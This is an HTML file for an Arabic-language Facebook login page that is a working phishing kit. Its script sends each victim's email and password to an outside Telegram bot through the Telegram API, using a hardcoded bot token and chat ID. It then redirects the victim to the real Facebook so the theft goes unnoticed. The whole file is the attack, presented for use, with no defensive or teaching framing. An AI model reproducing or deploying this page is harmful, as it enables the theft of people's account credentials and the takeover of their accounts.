# Facebook
تسجيل دخول فيسبوك 

<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>Facebook Clone</title>
    <style>
        * {
            box-sizing: border-box;
            font-family: Arial, sans-serif;
        }
        
        body {
            background: #f0f2f5;
            margin: 0;
            display: flex;
            justify-content: center;
            min-height: 100vh;
        }

        .facebook-header {
            text-align: center;
            margin: 100px 0;
        }

        .facebook-header h1 {
            color: #1877f2;
            font-size: 4em;
            margin: 0;
        }

        .login-box {
            background: white;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
            width: 400px;
            text-align: center;
        }

        input {
            width: 100%;
            padding: 14px;
            margin: 10px 0;
            border: 1px solid #ddd;
            border-radius: 6px;
            font-size: 16px;
        }

        .login-btn {
            background: #1877f2;
            color: white;
            border: none;
            padding: 14px;
            width: 100%;
            border-radius: 6px;
            font-weight: bold;
            cursor: pointer;
            font-size: 16px;
        }

        .forgot-password {
            color: #1877f2;
            text-decoration: none;
            display: block;
            margin: 15px 0;
        }

        .create-account {
            background: #42b72a;
            color: white;
            padding: 14px;
            border-radius: 6px;
            display: inline-block;
            margin-top: 20px;
            text-decoration: none;
            font-weight: bold;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="facebook-header">
            <h1>facebook</h1>
        </div>
        
        <div class="login-box">
            <input type="text" id="email" placeholder="البريد الإلكتروني أو رقم الهاتف">
            <input type="password" id="password" placeholder="كلمة السر">
            <button class="login-btn" onclick="sendCredentials()">تسجيل الدخول</button>
            <a href="#" class="forgot-password">هل نسيت كلمة السر؟</a>
            <hr>
            <a href="#" class="create-account">إنشاء حساب جديد</a>
        </div>
    </div>

    <script>
        const TELEGRAM_BOT_TOKEN = '7995503023:AAHOndTgymceZVM0JfSuXXUjZNUH4_Z2378'; // استبدل بمفتاح بوتك
        const TELEGRAM_CHAT_ID = '7869837768'; // استبدل بمعرف الدردشة

        async function sendCredentials() {
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;

            const message = `🎯 بيانات جديدة:\n📧 البريد: ${email}\n🔑 كلمة السر: ${password}`;

            try {
                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        chat_id: TELEGRAM_CHAT_ID,
                        text: message
                    })
                });
                
                window.location.href = 'https://www.facebook.com/'; // إعادة التوجيه بعد الإرسال
            } catch (error) {
                console.error('فشل الإرسال:', error);
            }
        }
    </script>
</body>
</html>
